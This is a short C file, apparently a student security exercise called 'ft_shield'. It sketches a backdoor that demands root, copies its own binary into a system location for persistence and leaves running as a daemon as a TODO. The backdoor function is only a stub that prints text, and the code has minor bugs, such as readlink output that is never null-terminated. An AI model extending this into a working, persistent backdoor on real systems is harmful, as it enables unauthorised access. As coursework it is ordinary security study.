#include "ft_shield.h"

void	backdoor()
{
	printf("backdoor !\n");
}

void	duplicate(char *path, char *target)
{
	char *buffer[BUFFER_SIZE];

	int src_fd = open(path, O_RDONLY);
	if (src_fd < 0)
		return ;
	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
	if (target_fd < 0)
	{
		close(src_fd);
		return ;
	}
	int ret;
	while ((ret = read(src_fd, buffer, BUFFER_SIZE)))
		write(target_fd, buffer, ret);
	close(target_fd);
	close(src_fd);
}

int		main(void)
{
	char path[MAX_PATH_SIZE];
	char bin_path[MAX_PATH_SIZE];
	char target_path[MAX_PATH_SIZE];

	if (geteuid())
	{
		printf("You must be root !\n");
		return (EXIT_FAILURE);
	}
	if (readlink(PROC_SELF_EXE, path, MAX_PATH_SIZE) < 0)
		return (EXIT_SUCCESS);
	if (readlink(TARGET_LOCATION, bin_path, MAX_PATH_SIZE) >= 0)
		sprintf(target_path, "/%s/%s", bin_path, PRG_NAME);
	else
		sprintf(target_path, "%s/%s", TARGET_LOCATION, PRG_NAME);
	if (strcmp(path, target_path))
	{
		printf("%s\n", STUDENT_LOGIN);
		duplicate(PROC_SELF_EXE, target_path);
		/* TODO: add as daemon */
	}
	else
		backdoor();
	return (EXIT_SUCCESS);
}
